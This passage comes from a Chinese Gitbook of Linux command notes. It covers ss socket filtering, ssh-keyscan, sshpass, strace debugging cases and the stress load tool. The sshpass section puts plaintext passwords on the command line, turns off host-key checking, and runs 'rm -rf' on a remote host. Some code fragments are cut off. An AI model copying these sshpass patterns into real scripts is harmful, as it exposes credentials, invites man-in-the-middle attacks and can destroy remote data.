Address:Port Peer Address:Port LISTEN 0 128 *:111 *:* LISTEN 0 128 *:22 *:* LISTEN 0 100 127.0.0.1:25 *:* LISTEN 0 128 :::111 :::* LISTEN 0 128 :::22 :::* LISTEN 0 100 ::1:25 :::* 3.3 通过 -r 选项解析 IP 和端口号 [root@master ~]# ss -tlr State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:rpc.portmapper *:* LISTEN 0 128 *:ssh *:* LISTEN 0 100 localhost:smtp *:* LISTEN 0 128 :::rpc.portmapper :::* LISTEN 0 128 :::ssh :::* LISTEN 0 100 localhost:smtp :::* 3.4 使用 -p 选项查看监听端口的程序名称 [root@master ~]# ss -tlp State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:sunrpc *:* users:((\"rpcbind\",pid=5502,fd=4),(\"systemd\",pid=1,fd=44)) LISTEN 0 128 *:ssh *:* users:((\"sshd\",pid=6477,fd=3)) LISTEN 0 100 127.0.0.1:smtp *:* users:((\"master\",pid=6890,fd=13)) LISTEN 0 128 :::sunrpc :::* users:((\"rpcbind\",pid=5502,fd=6),(\"systemd\",pid=1,fd=46)) LISTEN 0 128 :::ssh :::* users:((\"sshd\",pid=6477,fd=4)) LISTEN 0 100 ::1:smtp :::* users:((\"master\",pid=6890,fd=14)) 3.5 -a –all 对 TCP 协议来说，既包含监听的端口，也包含建立的连接 [root@master ~]# ss -tna State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:111 *:* LISTEN 0 128 *:22 *:* LISTEN 0 100 127.0.0.1:25 *:* ESTAB 0 52 192.168.211.12:22 192.168.211.1:62054 LISTEN 0 128 :::111 :::* LISTEN 0 128 :::22 :::* LISTEN 0 100 ::1:25 :::* 3.6 dst/src dport/sport 语法 可以通过 dst/src/dport/sprot 语法来过滤连接的来源和目标，来源端口和目标端口。 匹配远程地址和端口号 $ ss dst 192.168.1.5 $ ss dst 192.168.119.113:http $ ss dst 192.168.119.113:443 匹配本地地址和端口号 $ ss src 192.168.119.103 $ ss src 192.168.119.103:http $ ss src 192.168.119.103:80 将本地或者远程端口和一个数比较 可以使用下面的语法做端口号的过滤： $ ss dport OP PORT $ ss sport OP PORT OP 可以代表以下任意一个： # = or ge : 大于或等于端口号 # == or eq : 等于端口号 # != or ne : 不等于端口号 # or lt : 大于端口号 ss sport = :http ss dport = :http ss dport \\> :1024 ss sport \\> :1024 ss sport \\ 3.7 用TCP 状态过滤Sockets ss -4 state closing # ss -4 state FILTER-NAME-HERE # ss -6 state FILTER-NAME-HERE # FILTER-NAME-HERE 可以代表以下任何一个： # established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、 # all : 所有以上状态 # connected : 除了listen and closed的所有状态 # synchronized :所有已连接的状态除了syn-sent # bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv. # big : 和bucket相反. 3.8 显示TCP连接 [root@localhost ~]# ss -t -a State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 0 *:3306 *:* LISTEN 0 0 *:http *:* LISTEN 0 0 *:ssh *:* LISTEN 0 0 127.0.0.1:smtp *:* ESTAB 0 0 112.124.15.130:42071 42.156.166.25:http ESTAB 0 0 112.124.15.130:ssh 121.229.196.235:33398 查看TCP的连接状态 [root@localhost ~]# ss -tan|awk 'NR>1{++S[$1]}END{for (a in S) print a,S[a]}' LISTEN 7 ESTAB 31 TIME-WAIT 28 3.9 显示 Sockets 摘要 [root@localhost ~]# ss -s Total: 172 (kernel 189) TCP: 10 (estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5 Transport Total ip IPv6 * 189 - - RAW 0 0 0 UDP 5 5 0 TCP 6 6 0 INET 11 11 0 FRAG 0 0 0 列出当前的established, closed, orphaned and waiting TCP sockets 3.10 列出所有打开的网络连接端口 [root@localhost ~]# ss -l Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 *:3306 *:* 0 0 *:http *:* 0 0 *:ssh *:* 0 0 127.0.0.1:smtp *:* 3.11 查看进程使用的socket [root@localhost ~]# ss -pl Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 *:3306 *:* users:((\"mysqld\",1718,10)) 0 0 *:http *:* users:((\"nginx\",13312,5),(\"nginx\",13333,5)) 0 0 *:ssh *:* users:((\"sshd\",1379,3)) 0 0 127.0.0.1:smtp *:* us 找出打开套接字/端口应用程序 [root@localhost ~]# ss -pl | grep 3306 0 0 *:3306 *:* users:((\"mysqld\",1718,10)) 3.12 显示所有UDP Sockets [root@localhost ~]# ss -u -a State Recv-Q Send-Q Local Address:Port Peer Address:Port UNCONN 0 0 *:syslog *:* UNCONN 0 0 112.124.15.130:ntp *:* UNCONN 0 0 10.160.7.81:ntp *:* UNCONN 0 0 127.0.0.1:ntp *:* UNCONN 0 0 *:ntp *:* 3.13 所有端口为 22（ssh）的连接 [root@localhost ~]# ss state all sport = :ssh Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 128 *:ssh *:* tcp ESTAB 0 0 192.168.0.136:ssh 192.168.0.102:46540 tcp LISTEN 0 128 :::ssh :::* 参考： ss(8) — Linux manual page An Introduction to the ss Command How to Use the ss Command on Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_ssh-keyscan.html":{"url":"Linux-Command/Linux_Command_ssh-keyscan.html","title":"Linux Command Ssh Keyscan","keywords":"","body":"Linux Command ssh-keyscan1. 简介2. 格式3. 参数4. 安全5. 示例Linux Command ssh-keyscan tagsstart 远程 tagsstop 1. 简介 工具用来收集一组主机的 ssh 主机公钥 (host key), 设计目的是帮助建立和验证 ssh_known_hosts 文件.提供了一个小巧的接口让 shell 和 perl 文件使用. 使用了非阻塞 socket I/O 函数, 尽可能多的并行访问多个主机, 因此它的效率很高. 它可以在数十秒内采集某域中 1,000 台主机的密钥, 即使某些主机离线或不使用 ssh. 扫描的时候无须登录目标主机, 也不涉及任何加密操作. 2. 格式 ssh-keyscan -words [-v46 ] [-p port ] [-T timeout ] [-t type ] [-f file ] [host | addrlist namelist ] [... ] 3. 参数 -4：强制使用IPv4地址； -6：强制使用IPv6地址； -f：从指定文件中读取“地址列表/名字列表”； -p：指定连接远程主机的端口； -T：指定连接尝试的超时时间； -t：指定要创建的密钥类型； -v：信息模式，打印调试信息。 4. 安全 如果通过建立了 ssh_known_hosts 文件, 但却没有验证里面的公钥, 用户很容易遭到中间人 攻击. 而另一方面, 如果安全模型允许这个风险, 创建 ssh_known_hosts 文件后,能够帮助检测已经发起的密钥篡改或中间人攻击. 5. 示例 显示 hostname 的 rsa1 主机密钥: $ ssh-keyscan hostname k8s2-master ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtp4mHchzEKG17pseHL3sIruTTz3mdVUOdkSxjKecozFmCXBE6+gckswKWcY0p/gM5a47mf06fKMbN8m3F+mvDyKhzyry7z3I5UhL4NLluEWfJrUKV+K64hTt7qphHMnkBht+vDs6cSdRkD2VxWatQZ3MBAziLUKFlW8I5fVkGNgjuWyv0gaDDjZu1IqmKbJgd1hvRVuod0cM8xxlfXyx+owzJ2AnjKIzYM0YW3qvZuoU736Vpw4+XaQl0m0l6OBe531WyCH0WgO0613fgn0yQNJic0AxSv1nJmQ0C9h27F/xJ+3St18GO7T/unjARu8/MCgNWDMHm8vmeTFnSRfh5 # k8s2-master:22 SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 k8s2-master ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGCOYfqR4m29v1dhNa+NZdB/mr9LP+kuOSkvnwhNS59LnAN0rDbtdRC6nqEnhfTRZBpNULm5F8hq6oc3qDi/Nh0= # k8s2-master:22 SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 k8s2-master ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPNoeenh2kx3GDGJ2BvZRXY8AxtJ9AvowhVdV6LBckRS 参考： ssh-keyscan(1) — Linux manual page ssh-keyscan(1) - Linux man page ssh-keyscan - Unix, Linux Command Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_sshpass.html":{"url":"Linux-Command/Linux_Command_sshpass.html","title":"Linux Command Sshpass","keywords":"","body":"Linux Command sshpass 远程主机Linux Command sshpass 远程主机 tagsstart 远程 tagsstop 1、直接远程连接某主机 sshpass -p {密码} ssh {用户名}@{主机IP} 2、远程连接指定ssh的端口 sshpass -p {密码} ssh -p ${端口} {用户名}@{主机IP} 3、从密码文件读取文件内容作为密码去远程连接主机 sshpass -f ${密码文本文件} ssh {用户名}@{主机IP} 4、从远程主机上拉取文件到本地 sshpass -p {密码} scp {用户名}@{主机IP}:${远程主机目录} ${本地主机目录} 5、将主机目录文件拷贝至远程主机目录 sshpass -p {密码} scp ${本地主机目录} {用户名}@{主机IP}:${远程主机目录} 6、远程连接主机并执行命令 sshpass -p {密码} ssh -o StrictHostKeyChecking=no {用户名}@{主机IP} 'rm -rf /tmp/test' root@k8s2-master:~# sshpass -p foo ssh -o StrictHostKeyChecking=no root@192.168.211.51 \"hostname\" k8s2-node1 -o StrictHostKeyChecking=no ：忽略密码提示 拷贝密钥 sshpass -p 123456 ssh-copy-id -f root@192.168.211.51 参考： SSH password automation in Linux with sshpass sshpass: Login To SSH Server / Provide SSH Password Using A Shell Script sshpass：一个很棒的免交互 SSH 登录工具，但不要用在生产服务器上 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:24:06 "},"Linux-Command/Linux_Command_strace.html":{"url":"Linux-Command/Linux_Command_strace.html","title":"Linux Command Strace","keywords":"","body":"Linux Command strace 调试跟踪1. strace 是什么？2. strace 能做什么？3. strace 怎么用？3.1 系统调用3.2 strace 常用选项3.3 常见命令4. 两种运行模式。4.1 一种是通过它启动要跟踪的进程。4.2 另一种是跟踪已经在运行的进程5. strace 问题定位案例.51 定位进程异常退出5.2 定位共享内存异常5.3 性能分析5.4 strace 对进程的性能影响5.5 strace 调试连接问题Linux Command strace 调试跟踪 tagsstart 分析 进程 tagsstop 1. strace 是什么？ 按照strace官网的描述, strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。 strace底层使用内核的ptrace特性来实现其功能。 在运维的日常工作中，故障处理和问题诊断是个主要的内容，也是必备的技能。strace作为一种动态跟踪工具，能够帮助运维高效地定位进程和服务故障。它像是一个侦探，通过系统调用的蛛丝马迹，告诉你异常的真相。 图 1.2.73.1：在这里插入图片描述 2. strace 能做什么？ 运维工程师都是实践派的人，我们还是先来个例子吧。 我们从别的机器copy了个叫做some_server的软件包过来，开发说直接启动就行，啥都不用改。可是尝试启动时却报错，根本起不来！ 启动命令： ./some_server ../conf/some_server.conf 输出: FATAL: InitLogFile failed iRet: -1! Init error: -1655 为什么起不来呢？从日志看，似乎是初始化日志文件失败，真相到底怎样呢？我们用strace来看看。 strace -tt -f ./some_server ../conf/some_server.conf 输出: 我们注意到，在输出InitLogFile failed错误的前一行，有个open系统调用: 23:14:24.448034 open(\"/usr/local/apps/some_server/log//server_agent.log\", O_RDWR|O_CREAT|O_APPEND|O_LARGEFILE, 0666) = -1 ENOENT (No such file or directory) 它尝试打开文件/usr/local/apps/some_server/log//server_agent.log来写(不存在则创建)，可是却出错了，返回码是-1, 系统错误号errorno为ENOENT。 查下open系统调用的手册页： man 2 open 搜索ENOENT这个错误号errno的解释 ENOENT O_CREAT is not set and the named file does not exist. Or, a directory component in pathname does not exist or is a dangling symbolic link. 这里说得比较清楚，因为我们例子中的open选项指定了O_CREAT选项，这里errno为ENOENT的原因是日志路径中某个部分不存在或者是一个失效的符号链接。我们来一级一级看下路径中的哪部分不存在： ls -l /usr/local/apps/some_server/log ls: cannot access /usr/local/apps/some_server/log: No such file or directory ls -l /usr/local/apps/some_server total 8 drwxr-xr-x 2 root users 4096 May 14 23:13 bin drwxr-xr-x 2 root users 4096 May 14 22:48 conf 原来是log子目录不存在！上层目录都是存在的。手工创建log子目录后，服务就能正常启动了。 回过头来， strace究竟能做什么呢？ 它能够打开应用进程的这个黑盒，通过系统调用的线索，告诉你进程大概在干嘛。 3. strace 怎么用？ 既然strace是用来跟踪用户空间进程的系统调用和信号的，在进入strace使用的主题之前，我们的先理解什么是系统调用。 3.1 系统调用 按维基百科中的解释，在计算机中，系统调用（英语：system call），又称为系统呼叫，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。 系统调用提供用户程序与操作系统之间的接口。操作系统的进程空间分为用户空间和内核空间： 操作系统内核直接运行在硬件上，提供设备管理、内存管理、任务调度等功能。 用户空间通过API请求内核空间的服务来完成其功能——内核提供给用户空间的这些API, 就是系统调用。 在Linux系统上，应用代码通过glibc库封装的函数，间接使用系统调用。 Linux内核目前有300多个系统调用，详细的列表可以通过syscalls手册页查看。这些系统调用主要分为几类： 文件和设备访问类 比如open/close/read/write/chmod等 进程管理类 fork/clone/execve/exit/getpid等 信号类 signal/sigaction/kill 等 内存管理 brk/mmap/mlock等 进程间通信IPC shmget/semget * 信号量，共享内存，消息队列等 网络通信 socket/connect/sendto/sendmsg 等 熟悉Linux系统调用/系统编程，能够让我们在使用strace时得心应手。不过，对于运维的问题定位来说，知道strace这个工具，会查系统调用手册，就差不多够了。 常见的系统调用： Open() - 用于打开或创建文件的系统调用 Read() — 用于读取文件的系统调用 Write( ) — 用于写入文件的系统调用 Connect() — 用于打开与其他应用程序/网站/等的连接的系统调用。 futex() — 用于强制程序等待条件为真或在内存中实现锁定的系统调用 想要深入了解的同学，建议阅读《Linux系统编程》, 《Unix环境高级编程》等书籍。 3.2 strace 常用选项 strace -tt -T -v -f -e trace=file -o /data/log/strace.log -s 1024 -p 23489 -tt 在每行输出的前面，显示毫秒级别的时间 -T 显示每次系统调用所花费的时间 -v 对于某些相关调用，把完整的环境变量，文件stat结构等打出来。 -f 跟踪目标进程，以及目标进程创建的所有子进程 -e 控制要跟踪的事件和跟踪行为,比如指定要跟踪的系统调用名称 -o 把strace的输出单独写到指定的文件 -s 当系统调用的某个参数是字符串时，最多输出指定长度的内容，默认是32个字节 -p 指定要跟踪的进程pid, 要同时跟踪多个pid, 重复多次-p选项即可。 实例：跟踪nginx, 看其启动时都访问了哪些文件 strace -tt -T -f -e trace=file -o /data/log/strace.log -s 1024 ./nginx 3.3 常见命令 # Slow the target command and print details for each syscall: strace command # Slow the target PID and print details for each syscall: strace -p PID # Slow the target PID and any newly created child process, printing syscall details: strace -fp PID # Slow the target PID and record syscalls, printing a summary: strace -cp PID # Slow the target PID and print open() syscalls only: strace -eopen -p PID # Slow the target PID and print open() and stat() syscalls only: strace -eopen,stat -p PID # Slow the target PID and print connect() and accept() syscalls only: strace -econnect,accept -p PID # Slow the target command and see what other programs it launches (slow them too!): strace -qfeexecve command # Slow the target PID and print time-since-epoch with (distorted) microsecond resolution: strace -ttt -p PID # Slow the target PID and print syscall durations with (distorted) microsecond resolution: strace -T -p PID 4. 两种运行模式。 4.1 一种是通过它启动要跟踪的进程。 用法很简单，在原本的命令前加上strace即可。比如我们要跟踪 \"ls -lh /var/log/messages\" 这个命令的执行，可以这样： strace ls -lh /var/log/messages 4.2 另一种是跟踪已经在运行的进程 在不中断进程执行的情况下，理解它在干嘛。 这种情况，给strace传递个-p pid 选项即可。 比如，有个在运行的some_server服务，第一步，查看pid: pidof some_server 17553 得到其pid 17553然后就可以用strace跟踪其执行: strace -p 17553 完成跟踪时，按ctrl + C 结束strace即可。 strace有一些选项可以调整其行为，我们这里介绍下其中几个比较常用的，然后通过示例讲解其实际应用效果。 5. strace 问题定位案例 .51 定位进程异常退出 问题：机器上有个叫做run.sh的常驻脚本，运行一分钟后会死掉。需要查出死因。 定位：进程还在运行时，通过ps命令获取其pid, 假设我们得到的pid是24298 strace -o strace.log -tt -p 24298 查看strace.log, 我们在最后2行看到如下内容: 22:47:42.803937 wait4(-1, 22:47:43.228422 +++ killed by SIGKILL +++ 这里可以看出，进程是被其他进程用KILL信号杀死的。 实际上，通过分析，我们发现机器上别的服务有个监控脚本，它监控一个也叫做run.sh的进程，当发现run.sh进程数大于2时，就会把它杀死重启。结果导致我们这个run.sh脚本被误杀。 进程被杀退出时，strace会输出killed by SIGX(SIGX代表发送给进程的信号)等，那么，进程自己退出时会输出什么呢？ 这里有个叫做test_exit的程序，其代码如下: #include #include int main(int argc, char **argv) { exit(1); } 我们strace看下它退出时strace上能看到什么痕迹。 strace -tt -e trace=process -f ./test_exit 说明: -e trace=process 表示只跟踪和进程管理相关的系统调用。 输出： 23:07:24.672849 execve(\"./test_exit\", [\"./test_exit\"], [/* 35 vars */]) = 0 23:07:24.674665 arch_prctl(ARCH_SET_FS, 0x7f1c0eca7740) = 0 23:07:24.675108 exit_group(1) = ? 23:07:24.675259 +++ exited with 1 +++ 可以看出，进程自己退出时（调用exit函数，或者从main函数返回）, 最终调用的是exit_group系统调用， 并且strace会输出exited with X（X为退出码）。 可能有人会疑惑，代码里面明明调用的是exit, 怎么显示为exit_group? 这是因为这里的exit函数不是系统调用，而是glibc库提供的一个函数，exit函数的调用最终会转化为exit_group系统调用，它会退出当前进程的所有线程。实际上，有一个叫做_exit()的系统调用(注意exit前面的下划线), 线程退出时最终会调用它。 5.2 定位共享内存异常 有个服务启动时报错： shmget 267264 30097568: Invalid argument Can not get shm...exit! 错误日志大概告诉我们是获取共享内存出错，通过strace看下： strace -tt -f -e trace=ipc ./a_mon_svr ../conf/a_mon_svr.conf 输出： 22:46:36.351798 shmget(0x5feb, 12000, 0666) = 0 22:46:36.351939 shmat(0, 0, 0) = ? Process 21406 attached 22:46:36.355439 shmget(0x41400, 30097568, 0666) = -1 EINVAL (Invalid argument) shmget 267264 30097568: Invalid argument Can not get shm...exit! 这里，我们通过-e trace=ipc 选项，让strace只跟踪和进程通信相关的系统调用。 从strace输出，我们知道是shmget系统调用出错了，errno是EINVAL。同样， 查询下shmget手册页，搜索EINVAL的错误码的说明: EINVAL A new segment was to be created and size SHMMAX, or no new segment was to be created, a segment with given key existed, but size is greater than the size of that segment 翻译下，shmget设置EINVAL错误码的原因为下列之一： 要创建的共享内存段比 SHMMIN小 (一般是1个字节) 要创建的共享内存段比 SHMMAX 大 (内核参数kernel.shmmax配置) 指定key的共享内存段已存在，其大小和调用shmget时传递的值不同。 从strace输出看，我们要连的共享内存key 0x41400, 指定的大小是30097568字节，明显与第1、2种情况不匹配。那只剩下第三种情况。使用ipcs看下是否真的是大小不匹配： ipcs -m | grep 41400 key shmid owner perms bytes nattch status 0x00041400 1015822 root 666 30095516 1 可以看到，已经0x41400这个key已经存在，并且其大小为30095516字节，和我们调用参数中的30097568不匹配，于是产生了这个错误。 在我们这个案例里面，导致共享内存大小不一致的原因，是一组程序中，其中一个编译为32位，另外一个编译为64位,代码里面使用了long这个变长int数据类型。 把两个程序都编译为64解决了这个问题。 这里特别说下strace的-e trace选项。 要跟踪某个具体的系统调用，-e trace=xxx即可。但有时候我们要跟踪一类系统调用，比如所有和文件名有关的调用、所有和内存分配有关的调用。 如果人工输入每一个具体的系统调用名称，可能容易遗漏。于是strace提供了几类常用的系统调用组合名字。 -e trace=file 跟踪和文件访问相关的调用(参数中有文件名) -e trace=process 和进程管理相关的调用，比如fork/exec/exit_group -e trace=network 和网络通信相关的调用，比如socket/sendto/connect -e trace=signal 信号发送和处理相关，比如kill/sigaction -e trace=desc 和文件描述符相关，比如write/read/select/epoll等 -e trace=ipc 进程相关，比如shmget等 绝大多数情况，我们使用上面的组合名字就够了。实在需要跟踪具体的系统调用时，可能需要注意C库实现的差异。 比如我们知道创建进程使用的是fork系统调用，但在glibc里面，fork的调用实际上映射到了更底层的clone系统调用。使用strace时，得指定-e trace=clone, 指定-e trace=fork什么也匹配不上。 5.3 性能分析 假如有个需求，统计Linux 4.5.4 版本内核中的代码行数(包含汇编和C代码)。这里提供两个Shell脚本实现： poor_script.sh: !/bin/bash total_line=0 while read filename; do line=$(wc -l $filename | awk ‘{print $1}’) (( total_line += line )) done good_script.sh: !/bin/bash find linux-4.5.4 -type f ( -iname ‘.c’ -o -iname ‘.h’ -o -iname ‘*.S’ ) -print0 \\ | wc -l —files0-from - | tail -n 1 两段代码实现的目的是一样的。 我们通过strace的-c选项来分别统计两种版本的系统调用情况和其所花的时间(使用-f同时统计子进程的情况) 从两个输出可以看出，good_script.sh 只需要2秒就可以得到结果：19613114行。它大部分的调用(calls)开销是文件操作(read/open/write/close)等，统计代码行数本来就是干这些事情。 而poor_script.sh完成同样的任务则花了539秒。它大部分的调用开销都在进程和内存管理上(wait4/mmap/getpid…)。 实际上，从两个图中clone系统调用的次数,我们可以看出good_script.sh只需要启动3个进程，而poor_script.sh完成整个任务居然启动了126335个进程！ 而进程创建和销毁的代价是相当高的，性能不差才怪。 5.4 strace 对进程的性能影响 dd 在 0.268796 秒内完成。 现在用 strace 运行它（我们正在寻找一个不会发生的调用），我们可以看到它花了 13.7205 秒。增加了 5434%！不用说，这对任何应用程序都是毁灭性的。虽然这是最坏的情况，但我只是想向您展示它对正在运行的应用程序的影响，并确保您在有问题的应用程序上运行 strace。 5.5 strace 调试连接问题 置了一个无法连接到互联网的虚拟机。让我们调试它，看看为什么 strace -e poll,connect,select,recvfrom,sendto -o trace.txt nc yahoo.com 80 首先我们看到 connect 调用试图连接到 /var/run/nscd/socket。这是名称服务缓存守护程序，用于诸如 LDAP、NIS 或 YP 或其他目录协议之类的名称查找。在尝试了两次并失败后，它转到了 DNS（htons(53) 表示它正在连接端口 53，即 DNS）。但是我们可以看到它重试了这个并且失败了。我们可以确定我们的 ifcfg-eth0文件可能有问题。在这种情况下，我只是从未打开 eth0 :) 迅速运行和ifup eth0和rerunning strace，我们可以看到有很大的不同！ 我们可以看到，在尝试 NSCD 后，我们成功连接到 DNS，它通过 poll 和 sendto 调用以及相应的 recvfrom 调用向 yahoo.com 发送了一个 DNS 数据包。为了确认它已成功连接，我们可以检查 EINPROGRESS 调用。这表明该进程没有被阻塞并且将继续处理。这可以在这里看到： 更多阅读： strace(1) — Linux manual page https://strace.io/ strace 跟踪进程中的系统调用 Strace command in Linux with Examples strace Wow Much Syscall Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-07-29 03:20:46 "},"Linux-Command/Linux_Command_stress.html":{"url":"Linux-Command/Linux_Command_stress.html","title":"Linux Command Stress","keywords":"","body":"Linux Command stress 进程压力测试工具1. 简介2. 安装3. 参数4. 实战4.1 消耗 CPU 资源4.2 消耗内存资源4.3 消耗 IO 资源4.4 压测磁盘及 IO4.5 其它选项介绍Linux Command stress 进程压力测试工具 tagsstart 测试 进程 tagsstop 1. 简介 为了测试服务器的负载情况，可以使用stress这个压力测试工具 2. 安装 sudo yum install -y epel-release sudo yum install -y stress 3. 参数 语法格式： stress 常用选项： -c, --cpu N 产生 N 个进程，每个进程都反复不停的计算随机数的平方根 -i, --io N 产生 N 个进程，每个进程反复调用 sync() 将内存上的内容写到硬盘上 -m, --vm N 产生 N 个进程，每个进程不断分配和释放内存 --vm-bytes B 指定分配内存的大小 --vm-stride B 不断的给部分内存赋值，让 COW(Copy On Write)发生 --vm-hang N 指示每个消耗内存的进程在分配到内存后转入睡眠状态 N 秒，然后释放内存，一直重复执行这个过程 --vm-keep 一直占用内存，区别于不断的释放和重新分配(默认是不断释放并重新分配内存) -d, --hadd N 产生 N 个不断执行 write 和 unlink 函数的进程(创建文件，写入内容，删除文件) --hadd-bytes B 指定文件大小 -t, --timeout N 在 N 秒后结束程序 --backoff N 等待N微妙后开始运行 -q, --quiet 程序在运行的过程中不输出信息 -n, --dry-run 输出程序会做什么而并不实际执行相关的操作 --version 显示版本号 -v, --verbose 显示详细的信息 4. 实战 4.1 消耗 CPU 资源 stress 消耗 CPU 资源的方式是通过调用 sqrt 函数计算由 rand 函数产生的随机数的平方根实现的。下面的命令会产生 4 个这样的进程不断的进行计算： $ stress -c 4 stress: info: [8279] dispatching hogs: 4 cpu, 0 io, 0 vm, 0 hdd $ top top - 12:09:06 up 12 min, 3 users, load average: 3.11, 0.96, 0.38 Tasks: 141 total, 6 running, 135 sleeping, 0 stopped, 0 zombie %Cpu(s): 99.8 us, 0.1 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.1 si, 0.0 st KiB Mem : 2044472 total, 1095064 free, 269304 used, 680104 buff/cache KiB Swap: 2097148 total, 2097148 free, 0 used. 1660988 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8283 root 20 0 7308 96 0 R 100.0 0.0 1:06.35 stress 8281 root 20 0 7308 96 0 R 99.7 0.0 1:06.46 stress 8280 root 20 0 7308 96 0 R 99.3 0.0 1:05.83 stress 4.2 消耗内存资源 产生两个子进程，每个进程分配 300M 内存 $ stress --vm 2 --vm-bytes 300M --vm-keep stress: info: [8344] dispatching hogs: 0 cpu, 0 io, 2 vm, 0 hdd $ stress --vm 2 --vm-bytes 500M --vm-keep $ ps aux |grep stress root 8344 0.0 0.0 7308 432 pts/0 S+ 12:11 0:00 stress --vm 2 --vm-bytes 300M --vm-keep root 8345 99.3 15.0 314512 307268 pts/0 R+ 12:11 1:02 stress --vm 2 --vm-bytes 300M --vm-keep root 8346 99.3 15.0 314512 307268 pts/0 R+ 12:11 1:02 stress --vm 2 --vm-bytes 300M --vm-keep root 8358 0.0 0.0 112724 984 pts/1 S+ 12:12 0:00 grep --color=auto stress 父进程处于睡眠状态，两个子进程负责资源消耗。 $ top top - 12:15:45 up 19 min, 3 users, load average: 1.98, 1.64, 0.91 Tasks: 138 total, 3 running, 135 sleeping, 0 stopped, 0 zombie %Cpu0 : 0.0 us, 0.7 sy, 0.0 ni, 99.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu1 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu2 :100.0 us, 0.0 sy, 0.0 ni, 0.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu3 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 2044472 total, 479152 free, 884880 used, 680440 buff/cache KiB Swap: 2097148 total, 2097148 free, 0 used. 1045272 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8345 root 20 0 314512 307268 128 R 100.0 15.0 4:11.07 stress 8346 root 20 0 314512 307268 128 R 100.0 15.0 4:11.09 stress 7926 root 20 0 663944 44860 14128 S 1.0 2.2 0:13.82 containerd 9 root 20 0 0 0 0 S 0.3 0.0 0:00.92 rcu_sched 一直在进行默认的 stride 操作，user 非常高(cpu 在用户态忙碌)。 --vm-keep 一直占用内存，区别于不断的释放和重新分配(默认是不断释放并重新分配内存)。 --vm-hang N 指示每个消耗内存的进程在分配到内存后转入睡眠状态 N 秒，然后释放内存，一直重复执行这个过程。 --vm-keep 和 --vm-hang 都可以用来模拟只有少量内存的机器，但是指定它们时 CPU 的使用情况是不一样的。 $ stress --vm 2 --vm-bytes 500M --vm-hang 5 cpu不高 [root@localhost ~]# top top - 12:24:44 up 28 min, 3 users, load average: 0.12, 0.92, 0.98 Tasks: 138 total, 1 running, 137 sleeping, 0 stopped, 0 zombie %Cpu0 : 0.0 us, 0.3 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu1 : 0.0 us, 0.3 sy, 0.0 ni, 99.3 id, 0.0 wa, 0.0 hi, 0.3 si, 0.0 st %Cpu2 : 0.7 us, 7.7 sy, 0.0 ni, 91.6 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu3 : 0.3 us, 0.0 sy, 0.0 ni, 99.7 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 2044472 total, 70056 free, 1293968 used, 680448 buff/cache KiB Swap: 2097148 total, 2097148 free, 0 used. 636192 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 8428 root 20 0 519312 512088 132 S 4.3 25.0 0:07.09 stress 8427 root 20 0 519312 512088 132 S 4.0 25.0 0:07.75 stress --vm-stride B 不断的给部分内存赋值，让 COW(Copy On Write)发生。只要指定了内存相关的选项，这个操作就会执行，只是大小为默认的 4096。赋值内存的比例由参数决定： for (i = 0; i bytes 为消耗的总内存大小，stride 为间隔。 该参数会影响 CPU 状态 us 和 sy： $ stress --vm 2 --vm-bytes 500M --vm-stride 64 $ top %Cpu(s): 28.5 us, 21.8 sy $ stress --vm 2 --vm-bytes 500M --vm-stride 1M $ top %Cpu(s): 0.5 us, 49.1 sy 为什么会产生这样的结果？原因是单独的赋值和对比操作可以让 CPU 在用户态的负载占到 99% 以上。--vm-stride 值增大就意味着减少赋值和对比操作，这样就增加了内存的释放和分配次数(cpu在内核空间的负载)。 不指定 --vm-stride 选项就使用默认值是 4096，CPU 负载情况居于前两者之间： $ stress --vm 2 --vm-bytes 500M $ top %Cpu(s): 2.5 us, 48.0 sy 4.3 消耗 IO 资源 产生 4 个进程，每个进程都反复调用 sync 函数将内存上的内容写到硬盘上： $ top %Cpu(s): 0.0 us, 0.2 sy, 0.0 ni, 99.8 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st $ stress -i 4 stress: info: [8598] dispatching 